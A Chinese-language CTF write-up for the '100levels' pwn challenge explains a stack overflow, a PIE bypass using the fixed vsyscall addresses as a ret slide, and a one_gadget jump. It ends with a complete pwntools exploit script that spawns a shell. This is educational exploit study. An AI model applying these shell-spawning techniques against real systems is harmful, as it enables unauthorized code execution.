# 1000levels


# 涉及知识

+ 栈溢出
+ 绕过PIE保护
+ vsyscall的利用

<!--more-->

# 漏洞分析

## 保护机制

![1.png](https://i.loli.net/2020/05/20/kdJRiyZVEYHcxnL.png)

此题难点在于开启了PIE保护，影响程序的加载基址，地址随机化。

## IDA分析

![2.png](https://i.loli.net/2020/05/20/GmfAsrpRWlj8t3a.png)

hint函数中，不管if是否为真，system的地址都被储存在rbp-0x110处，这是非常有用的信息，是解这道题的关键

![1.png](https://i.loli.net/2020/05/20/pYN3VCKX9FHW65b.png)

在go函数中，如果第一次输入值小于等于零，将不会对rbp-0x110处的地址赋值，而如果在运行go函数前，运行了hint函数，rbp-0x110处的值将是system的地址。这是因为hint函数和go函数都是由同一个函数调用，栈信息相同。

![1.png](https://i.loli.net/2020/05/20/Yrys5cdFHG81JRk.png)

第二次输入的值，将会和rbp-0x110处的值相加，利用这一点，我们可以修改system的地址为one gadget的地址。（在这里system无法使用。system需要参数，而PIE保护开启，无法利用ROP）

![1.png](https://i.loli.net/2020/05/20/ZQEAtGHmC6s3Ndy.png)

选用第一个onegadget：0x4526a，第二个输入的值为两个函数偏移量的差值。

![1.png](https://i.loli.net/2020/05/20/DSTshBjC8ZdPf7p.png)

one_gadget的地址必定大于99，所以将进行100次游戏，在这里我们先进行99次游戏，在最后一次利用栈溢出，来执行我们的one gadget。但是这里还有一个问题，onegadget离返回地址处还有0x18个字节，我们需要在这几个位置注入影响较小的命令地址，来滑动到onedget处。PIE开启，函数地址都是随机的，我们就没有办法利用程序中现有的片段。

那应该怎么办？

虽然程序地址是随机的，但是vsyscall的地址是固定的。

vsyscall是一种古老的加快系统调用的机制。现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多硬件和内核等的操作都被封装成内核函数，提供一个接口，给用户态调用，这个调用接口就是我们熟知的int 0x80/syscall+调用号。当我们每次调用接口时，为了保障数据的隔离，都会把当前的上下文（寄存器状态）保存好，然后切换到内核态运行内核函数，最后将内核函数的返回结果保存在寄存器和内存中，再恢复上下文，切换到用户态。这一过程是非常消耗性能和时间的，对于一些调用频繁的内核函数，反复折腾，开销就会变成一个累赘。因此系统就把几个常用的无参内核调用从内核中映射到用户空间，这就是syscall。

利用gdb把syscall||dump出来加载到IDA中观察

````
seg000:FFFFFFFFFF600000 ; Segment type: Pure code
seg000:FFFFFFFFFF600000 seg000          segment byte public 'CODE' use64
seg000:FFFFFFFFFF600000                 assume cs:seg000
seg000:FFFFFFFFFF600000                 ;org 0FFFFFFFFFF600000h
seg000:FFFFFFFFFF600000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:FFFFFFFFFF600000                 mov     rax, 60h
seg000:FFFFFFFFFF600007                 syscall                 ; $!
seg000:FFFFFFFFFF600009                 retn
seg000:FFFFFFFFFF600009 ; ---------------------------------------------------------------------------
seg000:FFFFFFFFFF60000A                 align 400h
seg000:FFFFFFFFFF600400                 mov     rax, 0C9h
seg000:FFFFFFFFFF600407                 syscall                 ; $!
seg000:FFFFFFFFFF600409                 retn
seg000:FFFFFFFFFF600409 ; ---------------------------------------------------------------------------
seg000:FFFFFFFFFF60040A                 align 400h
seg000:FFFFFFFFFF600800                 mov     rax, 135h
seg000:FFFFFFFFFF600807                 syscall                 ; $!
seg000:FFFFFFFFFF600809                 retn
seg000:FFFFFFFFFF600809 ; ---------------------------------------------------------------------------
seg000:FFFFFFFFFF60080A                 align 800h
seg000:FFFFFFFFFF60080A seg000          ends
````

这里还有一点需要注意，我们不能将返回地址设置为0xFFFFFFFFFF600007，而是设置为0xFFFFFFFFFF600000。这是因为syscall会对其进行检测，如果不是函数的开头将会报错。

# EXP

````python
from pwn import*
elf=ELF('./libc.so')
sh=process('./100levels')
#sh=remote('111.198.29.45',58163)
target_off=0x4526a 
system_off=elf.symbols['system'] 


sh.recvuntil('Choice:\n')
sh.sendline('2')
sh.recvuntil('Choice:\n')
sh.sendline('1')
sh.recvuntil('How many levels?\n')
sh.sendline('0')
sh.recvuntil('Any more?\n')
sh.sendline(str(target_off-system_off))	

for i in range(99):
	sh.recvuntil('Question: ')
	parse=sh.recvuntil('=').replace('=','')
	ans=eval(parse)
	sh.sendline(str(ans))



payload='a'*56+p64(0xffffffffff600800)*3
sh.send(payload)

sh.interactive()
````

## 反思

+ 注意sendline发送后，read函数会读入换行符\xa

## 参考

[PIE保护绕过](https://www.anquanke.com/post/id/177520)

[vsyscall](http://blog.eonew.cn/archives/968)
